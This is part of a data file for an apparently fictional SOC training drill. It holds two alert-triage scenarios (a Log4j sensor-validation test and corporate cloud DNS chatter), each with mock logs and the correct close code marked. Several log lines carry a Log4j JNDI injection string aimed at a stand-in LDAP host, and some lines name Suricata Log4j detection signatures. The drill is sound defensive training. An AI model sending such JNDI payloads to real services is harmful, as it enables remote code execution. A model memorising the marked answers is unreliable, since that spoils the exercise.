        ],
        "logs": [
          {
            "id": "log-dest-rep",
            "title": "destination profile · known cleartext HTTP test host",
            "lines": [
              "# destination profile · alwayshttp.example (obfuscated from live DNS/http)",
              "query=alwayshttp.example",
              "rcode=NOERROR",
              "id.resp_h=203.0.113.80",
              "id.resp_p=80",
              "tls=absent",
              "known_http_test=true",
              "intel=benign cleartext HTTP echo/connectivity host — not malware staging",
              "",
              "# DNS sample (event ts from _raw_log)",
              "---",
              "{\"_path\":\"dns\",\"ts\":\"2026-08-03T23:20:41.788756Z\",\"uid\":\"Cfict0000200\",\"id.orig_h\":\"10.44.1.14\",\"query\":\"alwayshttp.example\",\"qtype_name\":\"A\",\"rcode_name\":\"NOERROR\",\"answers\":[\"203.0.113.80\"]}",
              "note=Safe boring plaintext target — matches sensor-validation practice"
            ]
          }
        ]
      },
      "source-net": {
        "name": "Source network",
        "tag": "[ops]",
        "narration": "10.44.1.14 sits on NOC wired, not guest or classroom Wi-Fi. Asset inventory lists hostname NOC-TEST-MBA14 in the NOC test laptop pool. Guest IR playbooks do not apply the same way to staff validation hosts on this segment.",
        "evidence": [
          {
            "id": "ev-noc-wired",
            "label": "source · NOC wired test pool",
            "detail": "Source network and inventory point to operations test gear, not a random attendee endpoint.",
            "hint": [
              "network=NOC wired",
              "pool=NOC test laptop"
            ]
          }
        ],
        "exits": [
          {
            "to": "detect-overlap",
            "label": "Compare detection overlap"
          },
          {
            "to": "dest-rep",
            "label": "Check destination reputation"
          },
          {
            "to": "observed-logs",
            "label": "Return to observed traffic"
          }
        ],
        "logs": [
          {
            "id": "log-source-net",
            "title": "asset profile · NOC wired test pool",
            "lines": [
              "# asset profile · 10.44.1.14 (obfuscated from live host/network labels)",
              "id.orig_h=10.44.1.14",
              "network=NOC wired",
              "pool=NOC test laptop",
              "hostname=NOC-TEST-MBA14",
              "os=macOS",
              "segment=operations floor wired — not guest/classroom Wi-Fi",
              "note=Inventory points to NOC validation gear; guest IR playbooks do not apply the same way"
            ]
          }
        ]
      },
      "detect-overlap": {
        "name": "Detection overlap",
        "tag": "[ids]",
        "narration": "At 23:20:41 a GET / to alwayshttp.example carries User-Agent ${jndi:ldap://noc-loopback.example/noc_stack_check}. Zeek notice CVE_2021_44228::LOG4J_ATTEMPT_HEADER and NGFW Critical threat Apache Log4j Remote Code Execution Vulnerability (action drop) fire on that second; three Suricata ET outbound Log4j signatures fire at 23:20:59 on the same uid. Overlap is the desired outcome of a multi-vendor sensor test. No inbound exploitation, no lateral movement from 10.44.1.14 in the window.",
        "evidence": [
          {
            "id": "ev-dual-stack",
            "label": "Suricata + NGFW · test success",
            "detail": "Dual-engine alert on a NOC-wired host to a known test destination reads as sensor validation, not guest compromise.",
            "hint": [
              "CVE_2021_44228::LOG4J_ATTEMPT_HEADER",
              "threat_name=Apache Log4j Remote Code Execution Vulnerability"
            ]
          }
        ],
        "exits": [
          {
            "to": "decision",
            "label": "Move to close codes",
            "requiresEvidence": 3
          },
          {
            "to": "source-net",
            "label": "Return to source network"
          },
          {
            "to": "dest-rep",
            "label": "Check destination reputation"
          }
        ],
        "logs": [
          {
            "id": "log-detect-hint",
            "title": "HINT · dual-engine Log4j on cleartext HTTP test host",
            "lines": [
              "# Hint from the wire (obfuscated from live Corelight + NGFW rows)",
              "# Same shape the hunt thread called out: Suricata and NGFW both catch outbound Log4j to a known HTTP test host",
              "id.orig_h=10.44.1.14",
              "id.resp_h=203.0.113.80",
              "id.resp_p=80",
              "host=alwayshttp.example",
              "method=GET",
              "uri=/",
              "tls=absent",
              "user_agent=${jndi:ldap://noc-loopback.example/noc_stack_check}",
              "engines=2",
              "same_minute=true",
              "note=Outbound exploit-shaped probe from NOC wired to a benign cleartext test destination — sensor validation, not guest compromise",
              "",
              "# Compacted samples",
              "{\"_path\":\"http\",\"ts\":\"2026-08-03T23:20:41.914050Z\",\"uid\":\"Cfict0000201\",\"id.orig_h\":\"10.44.1.14\",\"id.resp_h\":\"203.0.113.80\",\"id.resp_p\":80,\"method\":\"GET\",\"host\":\"alwayshttp.example\",\"uri\":\"/\",\"user_agent\":\"${jndi:ldap://noc-loopback.example/noc_stack_check}\"}",
              "{\"_path\":\"notice\",\"ts\":\"2026-08-03T23:20:41.914050Z\",\"uid\":\"Cfict0000201\",\"note\":\"CVE_2021_44228::LOG4J_ATTEMPT_HEADER\",\"msg\":\"Possible Log4j exploit CVE-2021-44228 exploit in header\",\"id.orig_h\":\"10.44.1.14\",\"id.resp_h\":\"203.0.113.80\",\"id.resp_p\":80}",
              "threat_name=Apache Log4j Remote Code Execution Vulnerability  severity=Critical  action=drop  threat_id=91991"
            ]
          },
          {
            "id": "log-detect-overlap",
            "title": "Suricata + NGFW · timed dual-engine samples",
            "lines": [
              "# timed dual-engine samples (identities fiction · event ts from _raw_log)",
              "id.orig_h=10.44.1.14",
              "host=alwayshttp.example",
              "id.resp_p=80",
              "engines=2",
              "",
              "# 23:20:41 · HTTP probe + Zeek notice + NGFW Critical",
              "---",
              "{\"_path\":\"http\",\"ts\":\"2026-08-03T23:20:41.914050Z\",\"uid\":\"Cfict0000201\",\"id.orig_h\":\"10.44.1.14\",\"id.resp_h\":\"203.0.113.80\",\"id.resp_p\":80,\"method\":\"GET\",\"host\":\"alwayshttp.example\",\"uri\":\"/\",\"user_agent\":\"${jndi:ldap://noc-loopback.example/noc_stack_check}\",\"client_headers\":{\"Host\":\"alwayshttp.example\",\"Accept\":\"*/*\",\"User-Agent\":\"${jndi:ldap://noc-loopback.example/noc_stack_check}\"}}",
              "{\"_path\":\"notice\",\"ts\":\"2026-08-03T23:20:41.914050Z\",\"uid\":\"Cfict0000201\",\"note\":\"CVE_2021_44228::LOG4J_ATTEMPT_HEADER\",\"sub\":\"uri='/', header name='USER-AGENT', header value='${jndi:ldap://noc-loopback.example/noc_stack_check}'\"}",
              "{\"_product\":\"NGFW\",\"ts\":\"2026-08-03T23:20:41.000000Z\",\"source_ip\":\"10.44.1.14\",\"dest_ip\":\"203.0.113.80\",\"dest_port\":80,\"threat_id\":91991,\"threat_name\":\"Apache Log4j Remote Code Execution Vulnerability\",\"severity\":\"Critical\",\"action\":\"drop\",\"app\":\"web-browsing\"}",
              "",
              "# 23:20:59 · Suricata ET outbound Log4j (same connection uid)",
              "---",
              "{\"_path\":\"suricata_corelight\",\"ts\":\"2026-08-03T23:20:59.961455Z\",\"uid\":\"Cfict0000201\",\"id.orig_h\":\"10.44.1.14\",\"id.resp_h\":\"203.0.113.80\",\"id.resp_p\":80,\"alert.signature\":\"ET EXPLOIT Apache log4j RCE Attempt (tcp ldap) (Outbound) (CVE-2021-44228)\",\"alert.signature_id\":2034759,\"alert.severity\":2,\"alert.action\":\"allowed\",\"service\":\"http\"}",
              "{\"_path\":\"suricata_corelight\",\"ts\":\"2026-08-03T23:20:59.961455Z\",\"uid\":\"Cfict0000201\",\"alert.signature\":\"ET EXPLOIT Apache log4j RCE Attempt - lower/upper TCP Bypass M2 (Outbound) (CVE-2021-44228)\",\"alert.signature_id\":2034800}",
              "{\"_path\":\"suricata_corelight\",\"ts\":\"2026-08-03T23:20:59.961455Z\",\"uid\":\"Cfict0000201\",\"alert.signature\":\"ET HUNTING Possible Apache log4j RCE Attempt - Any Protocol TCP (Outbound) (CVE-2021-44228)\",\"alert.signature_id\":2034783}",
              "payload_printable=GET / HTTP/1.1\\r\\nHost: alwayshttp.example\\r\\nAccept: */*\\r\\nUser-Agent: ${jndi:ldap://noc-loopback.example/noc_stack_check}\\r\\n\\r\\n",
              "note=Overlap is the desired outcome of a multi-vendor sensor test on cleartext HTTP"
            ]
          }
        ]
      },
      "decision": {
        "name": "Close codes",
        "tag": "[decision]",
        "narration": "Evidence covers real Log4j-style outbound probes in the same minute on Suricata and NGFW, a known HTTP test destination alwayshttp.example, a NOC wired test-pool source 10.44.1.14, and dual-engine detection that proves the stack is watching cleartext HTTP. One BH close code fits.",
        "isDecision": true,
        "actions": [
          {
            "id": "true-positive",
            "label": "True Positive",
            "resultNote": "True Positive fits hostile Log4j activity needing guest IR. Source and destination here match sanctioned sensor validation; escalate only if the host is not actually NOC test gear."
          },
          {
            "id": "false-positive",
            "label": "False Positive",
            "resultNote": "False Positive fits a wrong detector assertion. The probes and signatures are real; detectors did their job."
          },
          {
            "id": "bh-benign",
            "label": "BH Benign",
            "correct": true,
            "resultNote": "BH Benign fits expected NOC sensor-validation traffic: exploit-shaped probes from NOC wired to a known cleartext test host with dual-engine coverage."
          }
        ]
      }
    },
    "endings": {
      "win": {
        "title": "Closed BH Benign",
        "narration": "A-6633 closed BH Benign as NOC sensor validation. Detectors are confirmed working on cleartext HTTP Log4j content. Handover notes source 10.44.1.14 and alwayshttp.example."
      },
      "lose": {
        "title": "Wrong close code",
        "narration": "The queue records the chosen close code against evidence that still shows NOC-wired testing toward a known HTTP test host. The correct first close is below."
      },
      "timeout": {
        "title": "Window closed",
        "narration": "The queue moved on before a close code landed. The evidence trail remains below for review."
      }
    },
    "timeline": [
      {
        "id": "tl-dns",
        "t": "23:20:41",
        "label": "alwayshttp.example A resolves NOERROR for 10.44.1.14",
        "nodes": [
          "dest-rep"
        ],
        "hint": [
          "23:20:41",
          "alwayshttp.example"
        ],
        "tone": "info"
      },
      {
        "id": "tl-http-jndi",
        "t": "23:20:41",
        "label": "cleartext GET / with JNDI Log4j User-Agent to alwayshttp.example",
        "nodes": [
          "detect-overlap"
        ],
        "hint": [
          "23:20:41.914050",
          "noc_stack_check"
        ],
        "tone": "warn"
      },
      {
        "id": "tl-ngfw",
        "t": "23:20:41",
        "label": "NGFW Critical Log4j threat drop on :80",
        "nodes": [
          "detect-overlap"
        ],
        "hint": [
          "threat_name=Apache Log4j Remote Code Execution Vulnerability",
          "severity\":\"Critical\""
        ],
        "tone": "critical"
      },
      {
        "id": "tl-suricata",
        "t": "23:20:59",
        "label": "three Suricata ET outbound Log4j signatures on the same uid",
        "nodes": [
          "detect-overlap"
        ],
        "hint": [
          "23:20:59",
          "alert.signature_id\":2034759"
        ],
        "tone": "warn"
      },
      {
        "id": "tl-alert",
        "t": "23:59:59",
        "label": "A-6633 opens on the dual-engine Log4j rollup",
        "nodes": [
          "observed-logs"
        ],
        "hint": [
          "engines=2",
          "same_minute=true"
        ],
        "tone": "critical"
      }
    ]
  },
  {
    "id": "rivertide-azure-background",
    "meta": {
      "title": "Corp cloud DNS, mismatched class",
      "briefing": "Alert A-6644 is open: classroom IP 10.44.33.36 heavily queries RIVERTIDE Azure and intranet-looking names over a 37m window (17:03–17:40) while sitting on a Physical Access Lab VLAN. Names include flexops.azure.intra.rivertide.example, badgeprint.azure.intra.rivertide.example, and rivdirect.postgres.azure.intra.rivertide.example. DNS, proxy/tunnel background, and class alignment separate corp laptop chatter from hostile cloud probing. The correct BH close code is the goal. Target: under 3 minutes.",
      "targetSeconds": 180
    },
    "glossary": {
      "DNS": "The phone book of the internet: turns names into addresses computers dial.",
      "Azure": "A major cloud provider — companies often put internal apps and databases there.",
      "intranet": "Internal company names that usually only resolve for employees — odd to see on a show floor unless a corp laptop is present.",
      "EdgeTunnel": "Fictional enterprise secure-web/proxy agent used in this drill (stands in for a real cloud proxy).",
      "RIVERTIDE": "Fictional corporation used in this drill for corp-looking background traffic.",
      "VLAN": "A sliced-off piece of the network, like a separate hallway in the same building.",
      "classroom VLAN": "The network slice assigned to a training room — peers here often share class tooling.",
      "Pivot": "Jump to another log source using what is already found — follow the breadcrumb.",
      "BH close code": "How Black Hat SOC marks why an alert was closed — the official label for the outcome.",
      "True Positive": "Real bad or real impact that needed incident response. The alert was right and serious.",
      "False Positive": "The alert was wrong — it looked bad but the detection was a mistake.",
      "BH Benign": "Something that looked alarming but is allowed here (for example sanctioned class traffic).",
      "close code": "The final label on an alert that says what kind of finding it turned out to be.",
      "IR": "Incident response — the people and steps used when something real needs handling now.",
      "managed endpoint": "A company-controlled laptop that keeps checking in with corporate cloud services.",
      "CONNECT": "An HTTP method used to open a tunnel through a proxy — common for enterprise secure-web agents.",
      "NXDOMAIN": "DNS answer meaning that name does not exist at the resolver asked — venue DNS often cannot see corp intranet zones."
    },
    "startNode": "observed-logs",
    "nodes": {
      "observed-logs": {
        "name": "Observed DNS",
        "tag": "[dns]",
        "narration": "A-6644 · Medium · Heavy corp cloud DNS · 10.44.33.36 on Physical Access Lab VLAN · names include flexops.azure.intra.rivertide.example (19), badgeprint.azure.intra.rivertide.example (15), rivdirect.postgres.azure.intra.rivertide.example (13) · 37m window 17:03:14–17:40:28. Class topic does not mention RIVERTIDE cloud labs.",
        "evidence": [
          {
            "id": "ev-corp-dns",
            "label": "DNS · *.azure.intra.rivertide.example",
            "detail": "Host heavily resolves internal-looking RIVERTIDE Azure and database names from a classroom VLAN over a 37m window.",
            "hint": [
              "azure_intranet_names=3",
              "window_m=37"
            ]
          }
        ],
        "exits": [
          {
            "to": "proxy-background",
            "label": "Inspect proxy and tunnel traffic"
          },
          {
            "to": "asset-org",
            "label": "Profile org signals"
          },
          {
            "to": "class-align",
            "label": "Check class alignment"
          }
        ],
        "logs": [
          {
            "id": "log-dns-rollup",
            "title": "corelight_http_raw · corp Azure/intranet DNS rollup",
            "lines": [
              "# corelight_http_raw · dns · src 10.44.33.36 · Physical Access Lab VLAN",
              "# window for RIVERTIDE Azure/intranet names: 17:03:14–17:40:28 (~37m)",
              " hits  query",
              "   19  flexops.azure.intra.rivertide.example",
              "   15  badgeprint.azure.intra.rivertide.example",
              "   13  rivdirect.postgres.azure.intra.rivertide.example",
              "   34  gateway.edgetunnel-two.example",
              "   28  sitereview.edgetunnel.example",
              "   47  TOTAL   azure_intranet_names=3  window_m=37"
            ]
          },
          {
            "id": "log-dns-timed",
            "title": "corelight_http_raw · timed Azure/intranet DNS samples",
            "lines": [
              "# corelight_http_raw · timed dns samples (identities fiction · ts from _raw_log)",
              "id.orig_h=10.44.33.36",
              "id.resp_h=10.44.0.53",
              "qtype=A",
              "",
              "# Timed queries (chronological · ~37m Azure/intranet burst)",
              "---",
              "{\"_path\":\"dns\",\"ts\":\"2026-08-01T17:03:14.331229Z\",\"uid\":\"Cfict0006610\",\"id.orig_h\":\"10.44.33.36\",\"id.resp_h\":\"10.44.0.53\",\"query\":\"flexops.azure.intra.rivertide.example\",\"qtype_name\":\"A\",\"rcode_name\":\"NXDOMAIN\"}",
              "---",
              "{\"_path\":\"dns\",\"ts\":\"2026-08-01T17:03:19.320147Z\",\"uid\":\"Cfict0006611\",\"id.orig_h\":\"10.44.33.36\",\"id.resp_h\":\"10.44.0.53\",\"query\":\"badgeprint.azure.intra.rivertide.example\",\"qtype_name\":\"A\",\"rcode_name\":\"NXDOMAIN\"}",
              "---",
              "{\"_path\":\"dns\",\"ts\":\"2026-08-01T17:03:34.482764Z\",\"uid\":\"Cfict0006612\",\"id.orig_h\":\"10.44.33.36\",\"id.resp_h\":\"10.44.0.53\",\"query\":\"flexops.azure.intra.rivertide.example\",\"qtype_name\":\"A\",\"rcode_name\":\"NXDOMAIN\"}",
              "---",
              "{\"_path\":\"dns\",\"ts\":\"2026-08-01T17:30:52.617098Z\",\"uid\":\"Cfict0006613\",\"id.orig_h\":\"10.44.33.36\",\"id.resp_h\":\"10.44.0.53\",\"query\":\"badgeprint.azure.intra.rivertide.example\",\"qtype_name\":\"A\",\"rcode_name\":\"NXDOMAIN\"}",
              "---",
              "{\"_path\":\"dns\",\"ts\":\"2026-08-01T17:40:28.299195Z\",\"uid\":\"Cfict0006614\",\"id.orig_h\":\"10.44.33.36\",\"id.resp_h\":\"10.44.0.53\",\"query\":\"rivdirect.postgres.azure.intra.rivertide.example\",\"qtype_name\":\"A\",\"rcode_name\":\"NXDOMAIN\"}",
              "note=Venue resolvers NXDOMAIN corp intranet names; volume + EdgeTunnel still read as laptop background, not a successful cloud probe"
            ]
          }
        ]
      },
      "proxy-background": {
        "name": "Proxy background",
        "tag": "[http]",
        "narration": "HTTP CONNECT and agent beacons match EdgeTunnel enterprise proxy behavior: repeated cloud policy checks, Digest realm edgetunnel-two.example, and portal keepalives from 16:59 onward. Volume is background-managed-endpoint chatter, not a tight scan of a single database listener.",
        "evidence": [
          {
            "id": "ev-edge-tunnel",
            "label": "EdgeTunnel · corp proxy chatter",
            "detail": "Traffic shape matches a corporate secure-web agent keeping a managed laptop compliant, not interactive DB abuse.",
            "hint": [
              "EdgeTunnel/1.0",
              "realm=\"edgetunnel-two.example\""
            ]
          }
        ],
        "exits": [
          {
            "to": "asset-org",
            "label": "Profile org signals"
          },
          {
            "to": "class-align",
            "label": "Check class alignment"
          },
          {
            "to": "observed-logs",
            "label": "Return to observed DNS"
          }
        ],
        "logs": [
          {
            "id": "log-proxy-hint",
            "title": "HINT · corelight_http_raw · EdgeTunnel proxy CONNECT",
            "lines": [
              "# Hint from the wire (obfuscated from live Corelight http rows)",
              "# Same shape the hunt thread called out: enterprise tunnel agent keepalives, not interactive DB abuse",
              "id.orig_h=10.44.33.36",
              "method=CONNECT",
              "user_agent=Windows Microsoft Windows 11 Enterprise EdgeTunnel/1.0",
              "Proxy-Authorization=Digest … realm=\"edgetunnel-two.example\"",
              "uri_set=gateway.edgetunnel-two.example:80,www.edgetunnel.example:80,keepalive.cloud-portal.example:443",
              "status_mix=407,200,204",
              "note=EdgeTunnel CONNECT + Digest realm + portal keepalives = managed-endpoint proxy chatter",
              "",
              "# Example rows (fields compacted)",
              "{\"_path\":\"http\",\"id.orig_h\":\"10.44.33.36\",\"id.resp_h\":\"203.0.113.66\",\"id.resp_p\":443,\"method\":\"CONNECT\",\"uri\":\"gateway.edgetunnel-two.example:80\",\"status_code\":200,\"user_agent\":\"Windows Microsoft Windows 11 Enterprise EdgeTunnel/1.0\"}",
              "{\"_path\":\"http\",\"id.orig_h\":\"10.44.33.36\",\"id.resp_h\":\"203.0.113.66\",\"id.resp_p\":8080,\"method\":\"CONNECT\",\"uri\":\"www.edgetunnel.example:80\",\"status_code\":407,\"user_agent\":\"Windows Microsoft Windows 11 Enterprise EdgeTunnel/1.0\"}",
              "client_headers={\"Host\":\"www.edgetunnel.example:80\",\"User-Agent\":\"Windows Microsoft Windows 11 Enterprise EdgeTunnel/1.0\",\"Proxy-Authorization\":\"Digest username=\\\"[REDACTED]\\\", realm=\\\"edgetunnel-two.example\\\"\"}"
            ]
          },
          {
            "id": "log-proxy-timed",
            "title": "corelight_http_raw · timed EdgeTunnel samples",
            "lines": [
              "# corelight_http_raw · timed EdgeTunnel CONNECT samples (identities fiction)",
              "id.orig_h=10.44.33.36",
              "user_agent=Windows Microsoft Windows 11 Enterprise EdgeTunnel/1.0",
              "",
              "# Timed proxy rows (chronological · agent start through azure DNS window)",
              "---",
              "{\"_path\":\"http\",\"ts\":\"2026-08-01T16:59:41.114857Z\",\"uid\":\"Cfict0006601\",\"id.orig_h\":\"10.44.33.36\",\"id.resp_h\":\"203.0.113.66\",\"id.resp_p\":443,\"method\":\"CONNECT\",\"uri\":\"gateway.edgetunnel-two.example:80\",\"status_code\":200,\"user_agent\":\"Windows Microsoft Windows 11 Enterprise EdgeTunnel/1.0\"}",
              "---",
              "{\"_path\":\"http\",\"ts\":\"2026-08-01T16:59:41.193357Z\",\"uid\":\"Cfict0006602\",\"id.orig_h\":\"10.44.33.36\",\"id.resp_h\":\"203.0.113.66\",\"id.resp_p\":443,\"method\":\"GET\",\"host\":\"gateway.edgetunnel-two.example\",\"uri\":\"/et_conn_test\",\"status_code\":204,\"user_agent\":\"Mozilla/5.0 EdgeTunnel/1.0\"}",
              "---",
              "{\"_path\":\"http\",\"ts\":\"2026-08-01T16:59:41.613791Z\",\"uid\":\"Cfict0006603\",\"id.orig_h\":\"10.44.33.36\",\"id.resp_h\":\"203.0.113.66\",\"id.resp_p\":443,\"method\":\"CONNECT\",\"uri\":\"keepalive.cloud-portal.example:443\",\"status_code\":200,\"user_agent\":\"Windows Microsoft Windows 11 Enterprise EdgeTunnel/1.0\"}",
              "---",
              "{\"_path\":\"http\",\"ts\":\"2026-08-01T16:59:55.724899Z\",\"uid\":\"Cfict0006604\",\"id.orig_h\":\"10.44.33.36\",\"id.resp_h\":\"203.0.113.66\",\"id.resp_p\":8080,\"method\":\"CONNECT\",\"uri\":\"www.edgetunnel.example:80\",\"status_code\":407,\"user_agent\":\"Windows Microsoft Windows 11 Enterprise EdgeTunnel/1.0\"}",
              "Proxy-Authorization=Digest username=\"[REDACTED]\", realm=\"edgetunnel-two.example\"",
              "---",
              "{\"_path\":\"http\",\"ts\":\"2026-08-01T17:40:11.155269Z\",\"uid\":\"Cfict0006605\",\"id.orig_h\":\"10.44.33.36\",\"id.resp_h\":\"203.0.113.66\",\"id.resp_p\":8080,\"method\":\"CONNECT\",\"uri\":\"www.edgetunnel.example:80\",\"status_code\":407,\"user_agent\":\"Windows Microsoft Windows 11 Enterprise EdgeTunnel/1.0\"}",
              "note=Repeated CONNECT 407/200 to EdgeTunnel portals across the same hour as the Azure DNS burst — background agent, not a scan"
            ]
          }
        ]
      },
      "asset-org": {
        "name": "Org signals",
        "tag": "[asset]",
        "narration": "Device hostname RT-WIN-US-36 and tenant crumbs label the endpoint RIVERTIDE with high confidence. SharePoint host share.rivertide.example appears alongside the Azure intranet names and EdgeTunnel UA marker. Pattern is a corporate laptop on a training VLAN, not an anonymous VPS implant.",
        "evidence": [
          {
            "id": "ev-rivertide-asset",
            "label": "managed endpoint · RIVERTIDE",
            "detail": "Org identity explains why internal Azure names appear. Provenance beyond tenant signals is not established here.",
            "hint": [
              "org=RIVERTIDE",
              "sharepoint=share.rivertide.example"
            ]
          }
        ],
        "exits": [
          {
            "to": "class-align",
            "label": "Check class alignment"
          },
          {
            "to": "proxy-background",
            "label": "Inspect proxy and tunnel traffic"
          },
          {
            "to": "observed-logs",
            "label": "Return to observed DNS"
          }
        ],
        "logs": [
          {
            "id": "log-asset-org",
            "title": "asset profile · RIVERTIDE managed endpoint",
            "lines": [
              "# asset profile · 10.44.33.36 (obfuscated from live host identity)",
              "hostname=RT-WIN-US-36",
              "os=Windows",
              "org=RIVERTIDE",
              "org_confidence=HIGH",
              "sharepoint=share.rivertide.example",
              "proxy_agent=EdgeTunnel",
              "user_agent_marker=Windows Microsoft Windows 11 Enterprise EdgeTunnel/1.0",
              "vlan_label=Physical Access Lab",
              "active_window=2026-08-01 16:59 → 2026-08-01 22:22",
              "interactive_username=not observed on cleartext HTTP/NTLM this date",
              "note=Org + SharePoint + EdgeTunnel label a managed RIVERTIDE laptop. Provenance beyond tenant signals is not established here."
            ]
          }
        ]
      },
      "class-align": {
        "name": "Class alignment",
        "tag": "[ops]",
        "narration": "Physical Access Lab syllabus covers badges, RFID, and door controllers. It does not assign RIVERTIDE Azure labs. Misalignment explains the analyst gut-check, but EdgeTunnel plus tenant DNS still reads as corp laptop background. No exploit payload, no credential spray, no peer-less C2 pattern in this window.",
        "evidence": [
          {
            "id": "ev-mismatch-ok",
            "label": "class mismatch · still corp-normal",
            "detail": "Wrong class topic raises eyebrows; combined with managed RIVERTIDE + EdgeTunnel it does not earn True Positive by itself.",
            "hint": [
              "rivertide_azure_labs_assigned=false",
              "syllabus_topics=badges, RFID, door controllers, physical access tooling"
            ]
          }
        ],
        "exits": [
          {
            "to": "decision",
            "label": "Move to close codes",
            "requiresEvidence": 3
          },
          {
            "to": "asset-org",
            "label": "Return to org signals"
          },
          {
            "to": "proxy-background",
            "label": "Inspect proxy and tunnel traffic"
          }
        ],
        "logs": [
          {
            "id": "log-class-align",
            "title": "class alignment · Physical Access Lab",
            "lines": [
              "# class alignment · syllabus vs observed destinations",
              "vlan_label=Physical Access Lab",
              "syllabus_topics=badges, RFID, door controllers, physical access tooling",
              "rivertide_azure_labs_assigned=false",
              "observed_names=flexops.azure.intra.rivertide.example,badgeprint.azure.intra.rivertide.example,rivdirect.postgres.azure.intra.rivertide.example",
              "peer_hostile_pattern=false",
              "credential_spray=false",
              "exploit_payload=false",
              "note=Class topic mismatch explains the gut-check; EdgeTunnel + RIVERTIDE tenant DNS still read as corp laptop background on a training VLAN"
            ]
          }
        ]
      },
      "decision": {
        "name": "Close codes",
        "tag": "[decision]",
        "narration": "Evidence covers heavy RIVERTIDE Azure/intranet DNS over 37m, EdgeTunnel corporate proxy chatter, managed-endpoint org signals, and a class-topic mismatch without hostile follow-on. One BH close code fits.",
        "isDecision": true,
        "actions": [
          {
            "id": "true-positive",
            "label": "True Positive",
            "resultNote": "True Positive fits hostile probing of production cloud. Here the names and proxy agents match a RIVERTIDE managed laptop backgrounding to its own tenant."
          },
          {
            "id": "false-positive",
            "label": "False Positive",
            "resultNote": "False Positive fits a wrong detector assertion. The DNS volume and destinations are real; the question is intent and sanction, not detector failure."
          },
          {
            "id": "bh-benign",
            "label": "BH Benign",
            "correct": true,
            "resultNote": "BH Benign fits expected corporate laptop background on a training VLAN. Class mismatch is noted; EdgeTunnel and tenant DNS clear this as non-hostile guest behavior."
          }
        ]
      }
    },
    "endings": {
      "win": {
        "title": "Closed BH Benign",
        "narration": "A-6644 closed BH Benign. RIVERTIDE Azure/intranet DNS from 10.44.33.36 is treated as managed laptop background on a mismatched training VLAN. No intrusion IR ticket is opened."
      },
      "lose": {
        "title": "Wrong close code",
        "narration": "The queue records the chosen close code against evidence that still shows corp-normal EdgeTunnel and RIVERTIDE tenant traffic. The correct first close is below."
      },
      "timeout": {
        "title": "Window closed",
        "narration": "The queue moved on before a close code landed. The evidence trail remains below for review."
      }
    },
    "timeline": [
      {
        "id": "tl-edgetunnel-start",
        "t": "16:59:41",
        "label": "EdgeTunnel CONNECT to gateway.edgetunnel-two.example returns 200",
        "nodes": [
          "proxy-background"
        ],
        "hint": [
          "16:59:41",
          "gateway.edgetunnel-two.example"
        ],
        "tone": "info"
      },
      {
        "id": "tl-flexops",
        "t": "17:03:14",
        "label": "flexops.azure.intra.rivertide.example A query on venue DNS",
        "nodes": [
          "observed-logs"
        ],
        "hint": [
          "17:03:14",
          "flexops.azure.intra.rivertide.example"
        ],
        "tone": "warn"
      },
      {
        "id": "tl-badgeprint",
        "t": "17:03:19",
        "label": "badgeprint.azure.intra.rivertide.example A query on venue DNS",
        "nodes": [
          "observed-logs"
        ],
        "hint": [
          "17:03:19",
          "badgeprint.azure.intra.rivertide.example"
        ],
        "tone": "warn"
      },
      {
        "id": "tl-rivdirect",
        "t": "17:40:28",
        "label": "rivdirect.postgres.azure.intra.rivertide.example A query closes the 37m burst",
        "nodes": [
          "observed-logs"
        ],
        "hint": [
          "17:40:28",
          "rivdirect.postgres.azure.intra.rivertide.example"
        ],
        "tone": "warn"
      },
      {
        "id": "tl-alert",
        "t": "18:15:00",
        "label": "A-6644 opens on the RIVERTIDE Azure/intranet DNS rollup",
        "nodes": [
          "observed-logs"
        ],
        "hint": [
          "azure_intranet_names=3",
          "window_m=37"
        ],
        "tone": "critical"
      }
    ]
  }
];

window.THREAT_HUNT_APPS = [
  {
    id: 'gemini-threat-intelligence',
    kind: 'gemini-enterprise',
    title: 'Threat Intelligence',
    subtitle: 'VIP targeting · GTI · SecOps SIEM',
    blurb: 'Gemini Enterprise walk-up: correlate Google Threat Intelligence with SecOps SIEM, chase executive targeting, and drive remediation from a guided chat.',
    url: 'https://remix-remix-nocgentic-gemini-threat-intelligence-39857249566.us-west2.run.app/',
    badge: 'Gemini Enterprise',
  },
];
